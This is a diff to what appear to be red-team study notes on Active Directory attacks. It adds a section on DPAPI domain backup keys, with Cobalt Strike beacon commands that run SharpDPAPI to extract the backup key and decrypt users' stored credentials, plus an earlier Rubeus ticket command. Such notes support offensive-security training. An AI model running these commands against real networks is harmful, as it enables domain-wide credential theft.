@@ -67,4 +67,11 @@ ticket forgery:
         we can verify this works by running the describe command before and after
             e.g. PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:[krbtgt hash] /ticket:[TGT]
 
-dpapi backup keys
+dpapi backup keys:
+    a copy of the user's masterkey is encrypted with a "backup key" stored in AD
+    obtaining this key allows them to decrypt all DPAPI blobs for any user in the domain
+        beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
+    say we are cred hunting using SharpDPAPI:  
+        beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
+    we can provide the backup key to decrypt these creds:
+        beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:[backup key]
